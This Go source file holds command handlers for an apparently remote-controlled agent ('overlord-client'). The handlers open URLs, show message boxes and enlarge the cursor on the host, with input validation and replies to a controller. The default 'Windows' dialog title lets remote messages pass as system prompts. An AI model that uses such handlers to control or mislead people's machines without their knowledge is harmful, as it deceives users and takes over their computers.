package handlers

import (
	"context"
	"fmt"
	"log"
	"math"
	"net/url"
	"strings"
	"time"

	"overlord-client/cmd/agent/runtime"
)

const (
	maxOpenURLLength      = 2048
	maxMessageBoxTitleLen = 256
	maxMessageBoxTextLen  = 2048
	cursorBigMinSec       = 5
	cursorBigMaxSec       = 300
	cursorBigDefaultSec   = 30
)

var allowedMessageBoxIcons = map[string]struct{}{
	"error":    {},
	"warning":  {},
	"info":     {},
	"question": {},
}

func normalizeOpenURL(raw string) (string, error) {
	value := strings.TrimSpace(raw)
	if value == "" {
		return "", fmt.Errorf("url is required")
	}
	if len(value) > maxOpenURLLength {
		return "", fmt.Errorf("url is too long")
	}
	if strings.HasPrefix(value, "//") {
		value = "https:" + value
	} else if strings.HasPrefix(strings.ToLower(value), "https:") && !strings.HasPrefix(strings.ToLower(value), "https://") {
		value = "https://" + value[len("https:"):]
	} else if strings.HasPrefix(strings.ToLower(value), "http:") && !strings.HasPrefix(strings.ToLower(value), "http://") {
		value = "http://" + value[len("http:"):]
	} else if !strings.Contains(value, "://") {
		value = "https://" + value
	}
	parsed, err := url.Parse(value)
	if err != nil || parsed == nil {
		return "", fmt.Errorf("invalid url")
	}
	scheme := strings.ToLower(parsed.Scheme)
	if scheme != "http" && scheme != "https" {
		return "", fmt.Errorf("only http and https urls are allowed")
	}
	if strings.TrimSpace(parsed.Host) == "" {
		return "", fmt.Errorf("invalid url")
	}
	return parsed.String(), nil
}

func normalizeMessageBoxIcon(raw string) string {
	icon := strings.ToLower(strings.TrimSpace(raw))
	if icon == "alert" {
		icon = "warning"
	}
	if icon == "" {
		icon = "info"
	}
	return icon
}

func handleOpenURL(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	raw, _ := payload["url"].(string)
	target, err := normalizeOpenURL(raw)
	if err != nil {
		sendCommandResultSafe(env, cmdID, false, err.Error())
		return nil
	}
	goSafe("open_url", env.Cancel, func() {
		if err := openURLNative(target); err != nil {
			sendCommandResultSafe(env, cmdID, false, err.Error())
			return
		}
		sendCommandResultSafe(env, cmdID, true, "")
	})
	return nil
}

func handleMessageBox(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	text, _ := payload["text"].(string)
	text = strings.TrimSpace(text)
	if text == "" {
		sendCommandResultSafe(env, cmdID, false, "text is required")
		return nil
	}
	if len(text) > maxMessageBoxTextLen {
		sendCommandResultSafe(env, cmdID, false, "text is too long")
		return nil
	}

	title, _ := payload["title"].(string)
	title = strings.TrimSpace(title)
	if title == "" {
		title = "Windows"
	}
	if len(title) > maxMessageBoxTitleLen {
		sendCommandResultSafe(env, cmdID, false, "title is too long")
		return nil
	}

	iconRaw, _ := payload["icon"].(string)
	icon := normalizeMessageBoxIcon(iconRaw)
	if _, ok := allowedMessageBoxIcons[icon]; !ok {
		sendCommandResultSafe(env, cmdID, false, "icon must be error, warning, info, or question")
		return nil
	}

	// Show dialog asynchronously and report real success/failure once it is
	// confirmed visible (or fails). Do not wait for the user to click OK.
	goSafe("message_box", env.Cancel, func() {
		if err := showMessageBoxNative(title, text, icon); err != nil {
			log.Printf("message_box: display failed: %v", err)
			sendCommandResultSafe(env, cmdID, false, err.Error())
			return
		}
		sendCommandResultSafe(env, cmdID, true, "shown")
	})
	return nil
}

func normalizeCursorBigDuration(payload map[string]interface{}) (int, error) {
	var raw interface{}
	for _, key := range []string{"durationSec", "duration_sec", "duration"} {
		if v, ok := payload[key]; ok && v != nil {
			raw = v
			break
		}
	}
	if raw == nil {
		return cursorBigDefaultSec, nil
	}
	var n float64
	switch v := raw.(type) {
	case float64:
		n = v
	case float32:
		n = float64(v)
	case int:
		n = float64(v)
	case int32:
		n = float64(v)
	case int64:
		n = float64(v)
	case uint:
		n = float64(v)
	case uint32:
		n = float64(v)
	case uint64:
		n = float64(v)
	case string:
		trimmed := strings.TrimSpace(v)
		if trimmed == "" {
			return cursorBigDefaultSec, nil
		}
		var parsed float64
		if _, err := fmt.Sscanf(trimmed, "%f", &parsed); err != nil {
			return 0, fmt.Errorf("durationSec must be %d-%d", cursorBigMinSec, cursorBigMaxSec)
		}
		n = parsed
	default:
		return 0, fmt.Errorf("durationSec must be %d-%d", cursorBigMinSec, cursorBigMaxSec)
	}
	if math.IsNaN(n) || math.IsInf(n, 0) {
		return 0, fmt.Errorf("durationSec must be %d-%d", cursorBigMinSec, cursorBigMaxSec)
	}
	sec := int(math.Floor(n))
	if sec < cursorBigMinSec || sec > cursorBigMaxSec {
		return 0, fmt.Errorf("durationSec must be %d-%d", cursorBigMinSec, cursorBigMaxSec)
	}
	return sec, nil
}

func handleCursorBig(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	durationSec, err := normalizeCursorBigDuration(payload)
	if err != nil {
		sendCommandResultSafe(env, cmdID, false, err.Error())
		return nil
	}
	goSafe("cursor_big", env.Cancel, func() {
		// Apply immediately and schedule restore; do not block the command reply on duration.
		if err := applyBigCursorTimed(time.Duration(durationSec) * time.Second); err != nil {
			log.Printf("cursor_big: %v", err)
			sendCommandResultSafe(env, cmdID, false, err.Error())
			return
		}
		sendCommandResultSafe(env, cmdID, true, fmt.Sprintf("applied for %ds", durationSec))
	})
	return nil
}
